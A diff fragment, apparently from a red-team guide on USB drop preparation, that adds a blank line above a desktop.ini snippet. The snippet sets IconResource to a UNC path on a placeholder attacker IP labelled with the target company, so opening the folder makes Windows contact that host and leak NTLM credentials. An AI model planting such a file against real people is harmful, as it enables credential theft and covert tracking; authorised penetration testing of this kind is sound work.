@@ -349,6 +349,7 @@ File Preparation
 
 - Create a file titled “desktop.ini”
 - Place the below code in the file  
+  
 ```
 [.ShellClassInfo]
 IconResource=\\<ATTACKING_IP>\<TARGET_COMPANY>?usb=<USB_DESCRIPTION>.ico,0
